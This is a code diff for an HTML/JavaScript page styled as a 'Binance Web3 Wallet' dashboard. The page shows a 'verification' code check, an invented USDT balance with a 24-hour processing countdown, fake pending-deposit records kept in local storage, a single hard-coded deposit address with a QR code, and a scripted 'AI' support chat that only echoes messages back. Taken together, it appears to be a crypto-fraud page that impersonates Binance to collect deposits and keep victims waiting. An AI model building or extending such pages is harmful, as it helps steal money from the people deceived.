@@ -6,29 +6,41 @@
 <title>Binance Web3 Wallet Dashboard</title>
 <style>
   body{margin:0;font-family:sans-serif;background:#0b0b0f;color:white;}
-  .header,.footer{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#1e1e2a;}
-  .header img.logo{height:40px;}
-  .button{background:#2a2a3d;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer;margin:2px;display:flex;align-items:center;}
-  .button img{height:16px;margin-right:6px;}
-  .page{display:none;padding:10px;}
+  .header{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#1e1e2a;}
+  .header-left{display:flex;align-items:center;gap:10px;}
+  .header-right{display:flex;align-items:center;gap:10px;}
+  .header img.logo{height:32px;}
+  .button{background:#2a2a3d;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer;margin:2px;display:flex;align-items:center;font-size:12px;}
+  .button img,.button svg{height:16px;margin-right:6px;}
+  .page{display:none;padding:12px;}
   .page.active{display:block;}
-  .coin-item{padding:6px;cursor:pointer;display:flex;align-items:center;}
+  .coin-item{padding:6px;cursor:pointer;display:flex;align-items:center;border-bottom:1px solid #222;}
   .coin-item img{width:20px;height:20px;margin-right:6px;}
   .search-input{width:100%;padding:6px;margin-bottom:10px;border-radius:6px;border:none;background:#1a1a2b;color:white;}
-  #tradingview-widget-container{width:100%;height:400px;margin-bottom:10px;}
+  #tradingview-widget-container,#market-tradingview-widget,#trade-tradingview-widget{width:100%;height:400px;margin-bottom:10px;}
   .progress-ring{width:80px;height:80px;position:relative;margin:20px auto;}
-  .progress-ring circle{fill:transparent;stroke:#4caf50;stroke-width:8;transform:rotate(-90deg);transform-origin:50% 50%;}
+  .progress-ring circle{fill:transparent;stroke:#f0b90b;stroke-width:8;transform:rotate(-90deg);transform-origin:50% 50%;}
+  .transaction-item{padding:8px;border-bottom:1px solid #333;}
+  .tx-type.deposit{color:#00b300;font-weight:bold;}
+  .tx-type.withdrawal{color:#ff3b30;font-weight:bold;}
+  .tx-status.pending{color:orange;}
+  .tx-status.completed{color:#00b300;}
+  .tx-status.failed{color:#ff3b30;}
+  .footer{display:flex;justify-content:space-around;align-items:center;padding:10px;background:#1e1e2a;position:fixed;bottom:0;width:100%;}
+  .footer .button{flex:1;flex-direction:column;font-size:10px;}
 </style>
 </head>
 <body>
 
 <!-- Header -->
 <div class="header">
-  <img id="bnb-logo" src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB" style="width:32px;height:32px;margin-right:8px;">
-    <strong>Web3 Verification</strong>
+  <div class="header-left">
+    <img class="logo" src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB">
+    <strong>Binance Web3 Wallet</strong>
   </div>
-    <button class="button" id="notifications-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/appointment-reminders.png"/>Notifications</button>
-    <button class="button" id="transactions-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/bank-cards.png"/>Transactions</button>
+  <div class="header-right">
+    <button class="button" id="notifications-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/appointment-reminders.png"/>Notify</button>
+    <button class="button" id="transactions-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/bank-cards.png"/>Txns</button>
     <button class="button" id="more-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/menu-2.png"/>More</button>
   </div>
 </div>
@@ -65,20 +77,20 @@
   <button class="button" id="verify-btn">Verify</button>
 </div>
 
+<!-- Deposit Flow -->
 <div id="deposit-page" class="page">
   <h2>Deposit</h2>
   <input type="text" id="deposit-search" class="search-input" placeholder="Search coin..."/>
   <div id="deposit-coin-list"></div>
 </div>
 
-  
-
 <div id="network-page" class="page">
   <h2>Select Network</h2>
   <div class="coin-item" id="bnb-network">
-    <img id="bnb-logo" src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB" style="width:32px;height:32px;margin-right:8px;">
-   <p>BNB Smart Chain BEP20</p>
+    <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB">
+    <p>BNB Smart Chain BEP20</p>
   </div>
+</div>
 
 <div id="deposit-address-page" class="page">
   <h2>Deposit Address</h2>
@@ -100,7 +112,7 @@
   <p>Tether USDT: $8250.78</p>
   <div class="progress-ring">
     <svg width="80" height="80">
-      <circle r="36" cx="40" cy="40" stroke="#4caf50" stroke-width="8" fill="transparent"/>
+      <circle r="36" cx="40" cy="40"/>
     </svg>
   </div>
   <p id="countdown-timer">24:00:00</p>
@@ -111,15 +123,15 @@
   <p>Your funds are now available.</p>
 </div>
 
-
-  <!-- Transactions Page -->
+<!-- Transactions Page -->
 <div id="transactions-page" class="page">
   <h2>Transactions</h2>
   <div id="transactions-list" style="max-height:500px; overflow-y:auto; border:1px solid #333; padding:8px; border-radius:6px; background:#1a1a2b;">
     <!-- Transactions will appear here dynamically -->
   </div>
 </div>
-  
+
+<!-- Market Page -->
 <div id="market-page" class="page">
   <h2>Market</h2>
   <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
@@ -127,6 +139,7 @@
   <div id="market-tradingview-widget"></div>
 </div>
 
+<!-- Trade Page -->
 <div id="trade-page" class="page">
   <div class="card">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
@@ -143,8 +156,8 @@
 
 <!-- Footer -->
 <div class="footer">
-  <button class="button" id="home-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/home.png"/><br>Home</button>
-  <button class="button" id="market-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/line-chart.png"/><br>Market</button>
+  <button class="button" id="home-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/home.png"/>Home</button>
+  <button class="button" id="market-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/line-chart.png"/>Market</button>
   <button class="button" id="trade-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2l3 6h6l-4.8 4 1.8 6L12 14l-4 4 1.8-6L4 8h6z"/></svg>Trade</button>
 </div>
 
@@ -162,12 +175,18 @@ function showPage(id){
   localStorage.setItem('lastPage', id);
 }
 
-// Initialize on load
+// ================= Globals =================
+let coinsData = [];
+let notificationsEnabled = false;
+
+// ================= Init =================
 window.onload = async ()=>{
-  const last=localStorage.getItem('lastPage')||'home-page';
+  const last = localStorage.getItem('lastPage') || 'home-page';
   showPage(last);
   await loadCoins();
-  loadTradeChart('BTCUSDT');
+  loadTradeChart(localStorage.getItem('lastTradeSymbol') || 'BTCUSDT');
+  loadTransactions();
+  startTransactionUpdater();
 };
 
 // ================= Header Buttons =================
@@ -183,14 +202,13 @@ document.getElementById('market-btn').onclick = ()=>showPage('market-page');
 document.getElementById('trade-btn').onclick = ()=>showPage('trade-page');
 
 // ================= CoinGecko API =================
-let coinsData = [];
 async function loadCoins(){
   try{
     const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1');
     const data = await res.json();
     coinsData = data;
 
-    // Set USDT logo
+    // USDT logo
     const usdt = data.find(c => c.symbol.toLowerCase() === 'usdt');
     if(usdt) document.getElementById('usdt-logo').src = usdt.image;
 
@@ -198,7 +216,7 @@ async function loadCoins(){
     renderMarketList(data);
     renderTradeCoinSelect(data);
 
-    // Set BNB logo dynamically in network page
+    // BNB logo dynamically
     const bnb = data.find(c => c.symbol.toLowerCase() === 'bnb');
     if(bnb) document.querySelector('#bnb-network img').src = bnb.image;
 
@@ -251,6 +269,7 @@ function renderTradeCoinSelect(coins){
 
 // ================= TradingView Charts =================
 function loadTradingViewChart(symbol, containerId){
+  document.getElementById(containerId).innerHTML = ""; // reset
   new TradingView.widget({
     width: '100%',
     height: 400,
@@ -265,7 +284,7 @@ function loadTradingViewChart(symbol, containerId){
     hide_side_toolbar: false,
     allow_symbol_change: true,
     save_image: false,
-    studies: ['MASimple@tv-basicstudies', 'RSI@tv-basicstudies']
+    studies: ['MASimple@tv-basicstudies','RSI@tv-basicstudies']
   });
 }
 
@@ -274,7 +293,7 @@ function loadTradeChart(symbol){
   localStorage.setItem('lastTradeSymbol',symbol);
 }
 
-// ================= Homepage Run Button =================
+// ================= Homepage Run =================
 document.getElementById('run-btn').onclick = ()=>{
   const addr = document.getElementById('wallet-address').value.trim();
   if(!addr) return alert('Enter wallet address');
@@ -304,7 +323,6 @@ async function loadDepositCoins(){
     div.className = 'coin-item';
     div.innerHTML = `<img src="${c.image}" style="width:24px;height:24px;margin-right:8px;"> ${c.name}`;
     div.onclick = ()=>{
-      // Save selected coin
       localStorage.setItem('selectedCoin', JSON.stringify(c));
       showPage('network-page');
       renderNetworkSelection();
@@ -313,7 +331,6 @@ async function loadDepositCoins(){
   });
 }
 
-// ================= Network Selection =================
 function renderNetworkSelection(){
   const selectedCoin = JSON.parse(localStorage.getItem('selectedCoin') || "{}");
   const networkDiv = document.getElementById('bnb-network');
@@ -327,17 +344,10 @@ document.getElementById('bnb-network').onclick = ()=>{
   showPage('deposit-address-page');
   const depositAddress = "0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85";
   document.getElementById('deposit-address').textContent = depositAddress;
-
-  // Generate QR Code
-  document.getElementById('deposit-qr-code').innerHTML = ""; // clear old QR
-  new QRCode(document.getElementById('deposit-qr-code'),{
-    text: depositAddress,
-    width: 128,
-    height: 128
-  });
+  document.getElementById('deposit-qr-code').innerHTML = "";
+  new QRCode(document.getElementById('deposit-qr-code'),{text:depositAddress,width:128,height:128});
 };
 
-// ================= Copy Address =================
 document.getElementById('copy-address-btn').onclick = ()=>{
   const addr = document.getElementById('deposit-address').textContent;
   navigator.clipboard.writeText(addr).then(()=>{
@@ -346,90 +356,6 @@ document.getElementById('copy-address-btn').onclick = ()=>{
   });
 };
 
-// ================= Transaction Storage =================
-function loadTransactions() {
-  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
-  const list = document.getElementById("transactions-list");
-  list.innerHTML = "";
-
-  txs.forEach(tx => {
-    const div = document.createElement("div");
-    div.className = "transaction-item";
-
-    let statusDisplay = tx.status;
-    if (tx.status === "Pending") {
-      const remaining = getRemainingTime(tx.id);
-      statusDisplay = remaining > 0
-        ? `Processing... ${formatTime(remaining)} left`
-        : "Completed";
-    }
-
-    div.innerHTML = `
-      <div>
-        <strong>${tx.type}</strong> ${tx.coin} - ${tx.amount}
-        <br/><small>${new Date(tx.timestamp).toLocaleString()}</small>
-      </div>
-      <div class="tx-status">${statusDisplay}</div>
-    `;
-
-    list.appendChild(div);
-  });
-}
-
-// Add a new transaction
-function addTransaction(type, coin, amount, status) {
-  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
-  const tx = {
-    id: Date.now(), // unique ID
-    type,
-    coin,
-    amount,
-    status,
-    timestamp: new Date().toISOString(),
-    endTime: Date.now() + 24 * 60 * 60 * 1000 // 24h from now
-  };
-  txs.push(tx);
-  localStorage.setItem("transactions", JSON.stringify(txs));
-  loadTransactions();
-}
-
-// Get remaining countdown in ms
-function getRemainingTime(txId) {
-  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
-  const tx = txs.find(t => t.id === txId);
-  if (!tx) return 0;
-  return Math.max(0, tx.endTime - Date.now());
-}
-
-// Format ms into hh:mm:ss
-function formatTime(ms) {
-  const totalSeconds = Math.floor(ms / 1000);
-  const h = String(Math.floor(totalSeconds / 3600)).padStart(2, "0");
-  const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, "0");
-  const s = String(totalSeconds % 60).padStart(2, "0");
-  return `${h}:${m}:${s}`;
-}
-
-// Simulate processing: update UI every 1s
-function startTransactionUpdater() {
-  setInterval(() => {
-    const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
-    let updated = false;
-
-    txs.forEach(tx => {
-      if (tx.status === "Pending" && Date.now() >= tx.endTime) {
-        tx.status = "Completed";
-        updated = true;
-      }
-    });
-
-    if (updated) {
-      localStorage.setItem("transactions", JSON.stringify(txs));
-    }
-    loadTransactions();
-  }, 1000);
-}
-
 // ================= BNB Verification =================
 document.getElementById('bnb-verify-btn').onclick = ()=>{
   const code = document.getElementById('bnb-code-input').value.trim();
@@ -437,19 +363,64 @@ document.getElementById('bnb-verify-btn').onclick = ()=>{
   if(validCodes.includes(code)){
     showPage('processing-page');
     startCountdown();
-
-    // Add pending deposit with countdown
     addTransaction("Deposit", "USDT", "$8250.78", "Pending");
-  } else {
-    alert('Declined! Enter correct code.');
-  }
+  } else alert('Declined! Enter correct code.');
 };
 
-// ================= Init =================
-window.onload = () => {
+// ================= Transactions =================
+function loadTransactions(){
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const list = document.getElementById("transactions-list");
+  list.innerHTML = "";
+  txs.forEach(tx=>{
+    const div = document.createElement("div");
+    div.className = "transaction-item";
+    let statusDisplay = tx.status;
+    if(tx.status === "Pending"){
+      const remaining = getRemainingTime(tx.id);
+      statusDisplay = remaining>0 ? `Processing... ${formatTime(remaining)} left` : "Completed";
+    }
+    div.innerHTML = `
+      <div><strong>${tx.type}</strong> ${tx.coin} - ${tx.amount}<br/><small>${new Date(tx.timestamp).toLocaleString()}</small></div>
+      <div class="tx-status">${statusDisplay}</div>`;
+    list.appendChild(div);
+  });
+}
+
+function addTransaction(type, coin, amount, status){
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const tx = {id:Date.now(), type, coin, amount, status, timestamp:new Date().toISOString(), endTime:Date.now()+24*3600*1000};
+  txs.push(tx);
+  localStorage.setItem("transactions", JSON.stringify(txs));
   loadTransactions();
-  startTransactionUpdater();
-};
+}
+
+function getRemainingTime(txId){
+  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+  const tx = txs.find(t=>t.id===txId);
+  if(!tx) return 0;
+  return Math.max(0, tx.endTime - Date.now());
+}
+
+function formatTime(ms){
+  const s = Math.floor(ms/1000);
+  const h = String(Math.floor(s/3600)).padStart(2,'0');
+  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
+  const sec = String(s%60).padStart(2,'0');
+  return `${h}:${m}:${sec}`;
+}
+
+function startTransactionUpdater(){
+  setInterval(()=>{
+    const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+    let updated=false;
+    txs.forEach(tx=>{
+      if(tx.status==="Pending" && Date.now()>=tx.endTime){tx.status="Completed";updated=true;}
+    });
+    if(updated) localStorage.setItem("transactions", JSON.stringify(txs));
+    loadTransactions();
+  },1000);
+}
 
 // ================= Countdown =================
 function startCountdown(){
@@ -457,10 +428,10 @@ function startCountdown(){
   localStorage.setItem('verificationEndTime', endTime);
   document.getElementById('processing-address').textContent = document.getElementById('verify-wallet-address').value;
   const circle = document.querySelector('.progress-ring circle');
-  const radius = circle.r.baseVal.value;
-  const circumference = 2*Math.PI*radius;
-  circle.style.strokeDasharray = `${circumference} ${circumference}`;
-  circle.style.strokeDashoffset = circumference;
+  const r = circle.r.baseVal.value;
+  const c = 2*Math.PI*r;
+  circle.style.strokeDasharray = `${c} ${c}`;
+  circle.style.strokeDashoffset = c;
 
   function update(){
     const diff = endTime - Date.now();
@@ -470,11 +441,9 @@ function startCountdown(){
       localStorage.removeItem('verificationEndTime');
       return;
     }
-    const h = Math.floor(diff/3600000);
-    const m = Math.floor((diff%3600000)/60000);
-    const s = Math.floor((diff%60000)/1000);
+    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
     document.getElementById('countdown-timer').textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-    circle.style.strokeDashoffset = circumference - (diff/(24*3600*1000))*circumference;
+    circle.style.strokeDashoffset = c - (diff/(24*3600*1000))*c;
     requestAnimationFrame(update);
   }
   update();
@@ -487,10 +456,9 @@ function startCountdown(){
     if(id==='coin-search') renderHomepageCoins(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
     if(id==='market-search') renderMarketList(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
     if(id==='deposit-search'){
-      const list=document.getElementById('deposit-coin-list');
-      list.innerHTML='';
+      const list=document.getElementById('deposit-coin-list'); list.innerHTML='';
       coinsData.filter(c=>c.name.toLowerCase().includes(term)).forEach(c=>{
-        const div = document.createElement('div');
+        const div=document.createElement('div');
         div.className='coin-item';
         div.innerHTML=`<img src="${c.image}">${c.name}`;
         div.onclick = ()=>showPage('network-page');
@@ -501,9 +469,8 @@ function startCountdown(){
 });
 
 // ================= Notifications =================
-let notificationsEnabled = false;
-document.getElementById('notif-on-btn').onclick = ()=>{ notificationsEnabled=true; alert('Notifications enabled!'); scheduleMarketNotification(); };
-document.getElementById('notif-off-btn').onclick = ()=>{ notificationsEnabled=false; alert('Notifications disabled!'); };
+document.getElementById('notif-on-btn').onclick = ()=>{notificationsEnabled=true;alert('Notifications enabled!');scheduleMarketNotification();};
+document.getElementById('notif-off-btn').onclick = ()=>{notificationsEnabled=false;alert('Notifications disabled!');};
 
 function scheduleMarketNotification(){
   if(!notificationsEnabled) return;
@@ -513,23 +480,20 @@ function scheduleMarketNotification(){
       const data = await res.json();
       const msg = `Top Coin: ${data[0].name} $${data[0].current_price.toLocaleString()}`;
       alert(msg);
-    } catch(e){ console.error(e); }
-  }, 24*3600*1000);
+    }catch(e){console.error(e);}
+  },24*3600*1000);
 }
 
 // ================= Support Chat =================
 document.getElementById('support-send-btn').onclick = ()=>{
-  const input = document.getElementById('support-input');
-  const chat = document.getElementById('support-chat');
-  const msg = input.value.trim();
+  const input=document.getElementById('support-input');
+  const chat=document.getElementById('support-chat');
+  const msg=input.value.trim();
   if(!msg) return;
-  chat.innerHTML += `<div><strong>You:</strong> ${msg}</div>`;
-  input.value = ''; chat.scrollTop = chat.scrollHeight;
-  setTimeout(()=>{
-    chat.innerHTML += `<div><strong>AI:</strong> Response to: "${msg}"</div>`;
-    chat.scrollTop = chat.scrollHeight;
-  }, 1000);
+  chat.innerHTML+=`<div><strong>You:</strong> ${msg}</div>`;
+  input.value=''; chat.scrollTop=chat.scrollHeight;
+  setTimeout(()=>{chat.innerHTML+=`<div><strong>AI:</strong> Response to: "${msg}"</div>`;chat.scrollTop=chat.scrollHeight;},1000);
 };
-</script>
-</body>
+</script>   
+ </body>
 </html>
